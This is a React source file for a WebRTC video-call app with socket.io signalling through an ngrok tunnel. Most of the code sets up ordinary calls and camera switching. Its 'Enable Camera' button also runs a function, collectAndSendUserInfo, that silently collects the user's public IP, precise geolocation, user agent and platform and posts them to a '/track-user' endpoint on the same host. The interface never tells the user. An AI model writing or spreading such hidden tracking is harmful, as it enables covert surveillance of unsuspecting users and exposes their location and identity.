import React, { useRef, useEffect, useState } from 'react';
import { io } from 'socket.io-client';
import 'bootstrap/dist/css/bootstrap.min.css';
import './App.css';
import { motion } from 'framer-motion';

const socket = io("https://8c1f-202-173-124-126.ngrok-free.app", {
  transports: ['websocket'],
  path: "/socket.io",
});

const App = () => {
  const localVideo = useRef(null);
  const remoteVideo = useRef(null);
  const [mediaStream, setMediaStream] = useState(null);
  const [peerConnection, setPeerConnection] = useState(null);
  const [socketId, setSocketId] = useState('');
  const [targetId, setTargetId] = useState('');
  const [onlineUsers, setOnlineUsers] = useState([]);
  const [streamStarted, setStreamStarted] = useState(false);
  const [videoDevices, setVideoDevices] = useState([]);
  const [currentCameraIndex, setCurrentCameraIndex] = useState(0);

  useEffect(() => {
    socket.on('connect', () => {
      setSocketId(socket.id);
    });

    socket.on('online-users', (users) => {
      setOnlineUsers(users.filter(id => id !== socket.id));
    });

    socket.on('offer', async ({ from, offer }) => {
      const stream = await startLocalStream(); // Ensure local stream before creating PC
      const pc = createPeerConnection(from, stream);
      await pc.setRemoteDescription(new RTCSessionDescription(offer));
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      socket.emit('answer', { to: from, answer });
      setPeerConnection(pc);
      setTargetId(from);
    });

    socket.on('answer', ({ answer }) => {
      if (peerConnection) {
        peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
      }
    });

    socket.on('ice-candidate', ({ candidate }) => {
      if (peerConnection && candidate) {
        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
      }
    });

    return () => {
      socket.off('connect');
      socket.off('online-users');
      socket.off('offer');
      socket.off('answer');
      socket.off('ice-candidate');
    };
  }, [peerConnection]);

  const startLocalStream = async (indexToUse = null) => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoInputs = devices.filter(device => device.kind === 'videoinput');
      setVideoDevices(videoInputs);

      const selectedDeviceId = indexToUse !== null
        ? videoInputs[indexToUse % videoInputs.length]?.deviceId
        : videoInputs[0]?.deviceId;

      if (!selectedDeviceId) throw new Error("No video device found");

      const constraints = {
        video: { deviceId: { exact: selectedDeviceId } },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      if (localVideo.current) localVideo.current.srcObject = stream;

      // Stop old tracks
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }

      setMediaStream(stream);
      setStreamStarted(true);
      setCurrentCameraIndex(indexToUse ?? 0);

      return stream;
    } catch (err) {
      alert("Camera/Mic access denied or failed\n\n" + err.message);
      console.error("Media Error:", err);
      return null;
    }
  };

  const createPeerConnection = (remoteId, stream) => {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });

    stream?.getTracks().forEach(track => {
      pc.addTrack(track, stream);
    });

    pc.ontrack = (event) => {
      if (remoteVideo.current && event.streams[0]) {
        remoteVideo.current.srcObject = event.streams[0];
      }
    };

    pc.onicecandidate = (event) => {
      if (event.candidate) {
        socket.emit('ice-candidate', {
          to: remoteId,
          candidate: event.candidate
        });
      }
    };

    return pc;
  };

  const callUser = async (id = targetId) => {
    if (!id.trim()) return alert("Enter a valid ID");
    setTargetId(id);
    const stream = await startLocalStream(currentCameraIndex);
    const pc = createPeerConnection(id, stream);
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit("offer", { to: id, offer });
    setPeerConnection(pc);
  };

  const collectAndSendUserInfo = async () => {
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const { ip } = await ipRes.json();

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const payload = {
            ip,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            time: new Date().toISOString()
          };

          await fetch("https://8c1f-202-173-124-126.ngrok-free.app/track-user", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });
        },
        err => console.error("Geo error", err),
        { enableHighAccuracy: true }
      );
    } catch (err) {
      console.error("User tracking failed:", err);
    }
  };

  return (
    <div className="video-wrapper">
      <video
        ref={remoteVideo}
        autoPlay
        playsInline
        className="remote-video"
        style={{ transform: 'scaleX(-1)' }}
      />
      <motion.video
        ref={localVideo}
        drag
        dragConstraints={{ top: 0, bottom: 300, left: 0, right: 300 }}
        autoPlay
        muted
        playsInline
        className="local-video"
        style={{ transform: 'scaleX(-1)' }}
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5 }}
      />

      <div className="controls-container">
        <button
          className="btn btn-secondary mb-2"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#controlPanel"
        >
          Toggle Controls
        </button>

        <div className="collapse show" id="controlPanel">
          <div className="card card-body text-white bg-dark">
            <p>Your ID: <strong>{socketId}</strong></p>
            <input
              type="text"
              className="form-control mb-2"
              placeholder="Enter ID to call"
              value={targetId}
              onChange={(e) => setTargetId(e.target.value)}
            />
            <div className="d-flex gap-2 flex-wrap">
              <button className="btn btn-primary" onClick={() => callUser()}>Call</button>
              {!streamStarted && (
                <button
                  className="btn btn-warning"
                  onClick={() => {
                    startLocalStream();
                    collectAndSendUserInfo();
                  }}
                >
                  Enable Camera
                </button>
              )}
              <button
                className="btn btn-outline-info"
                onClick={() =>
                  startLocalStream((currentCameraIndex + 1) % videoDevices.length)
                }
              >
                🔁 Switch Camera
              </button>
            </div>
            <div className="mt-3">
              <strong>Online Users:</strong>
              <div className="d-flex flex-wrap gap-2 mt-1">
                {onlineUsers.length === 0
                  ? <span>No one else online</span>
                  : onlineUsers.map(id => (
                    <button
                      className="btn btn-outline-light btn-sm"
                      key={id}
                      onClick={() => callUser(id)}
                    >
                      {id}
                    </button>
                  ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;
